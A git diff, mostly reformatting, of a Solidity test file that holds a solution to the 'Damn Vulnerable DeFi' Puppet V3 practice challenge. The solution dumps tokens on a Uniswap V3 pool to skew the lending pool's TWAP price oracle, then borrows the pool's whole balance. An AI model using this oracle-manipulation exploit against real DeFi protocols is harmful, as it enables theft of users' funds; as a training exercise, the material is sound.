@@ -13,7 +13,6 @@ import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
 import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
-
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -27,7 +26,8 @@ contract PuppetV3Challenge is Test {
     uint24 constant FEE = 3000;
 
     IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
-    INonfungiblePositionManager positionManager = INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
+    INonfungiblePositionManager positionManager =
+        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
     WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     DamnValuableToken token;
     PuppetV3Pool lendingPool;
@@ -63,7 +63,12 @@ contract PuppetV3Challenge is Test {
         bool isWethFirst = address(weth) < address(token);
         address token0 = isWethFirst ? address(weth) : address(token);
         address token1 = isWethFirst ? address(token) : address(weth);
-        positionManager.createAndInitializePoolIfNecessary({token0: token0, token1: token1, fee: FEE, sqrtPriceX96: _encodePriceSqrt(1, 1)});
+        positionManager.createAndInitializePoolIfNecessary({
+            token0: token0,
+            token1: token1,
+            fee: FEE,
+            sqrtPriceX96: _encodePriceSqrt(1, 1)
+        });
 
         IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
         uniswapPool.increaseObservationCardinalityNext(40);
@@ -117,39 +122,41 @@ contract PuppetV3Challenge is Test {
      */
     function test_puppetV3() public checkSolvedByPlayer {
         ISwapRouter swapRouter = ISwapRouter(address(0xE592427A0AEce92De3Edee1F18E0157C05861564));
-    
+
         emit log_named_decimal_uint("player ETH balance before price manipulation", player.balance, 18);
         emit log_named_decimal_uint("player DVT balance before price manipulation", token.balanceOf(player), 18);
 
-        token.approve(address(swapRouter),PLAYER_INITIAL_TOKEN_BALANCE);
-        uint256 wethAmountOut =swapRouter.exactInputSingle(ISwapRouter.ExactInputSingleParams({
-            tokenIn: address(token),
-            tokenOut: address(weth),
-            fee: FEE,
-            recipient: player,
-            deadline: block.timestamp,
-            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
-            amountOutMinimum: 0,
-            sqrtPriceLimitX96: 0
-        }));
-        
+        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 wethAmountOut = swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
         console.log();
         console.log("swap completed");
-        
+
         emit log_named_decimal_uint("wethAmountOut from swapping player's all DVTs", wethAmountOut, 18);
         emit log_named_decimal_uint("player ETH balance after price manipulation", player.balance, 18);
         emit log_named_decimal_uint("player DVT balance after price manipulation", token.balanceOf(player), 18);
         emit log_named_decimal_uint("player WETH balance after price manipulation", weth.balanceOf(player), 18);
-        
+
         vm.warp(block.timestamp + 114);
-        
+
         uint256 wethRequiredAfter = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
         emit log_named_decimal_uint("WETH Required after price manipulation", wethRequiredAfter, 18);
-        
+
         weth.approve(address(lendingPool), 0.2 ether);
         lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
         emit log_named_decimal_uint("player DVT balance after price manipulation", token.balanceOf(player), 18);
-        
+
         token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
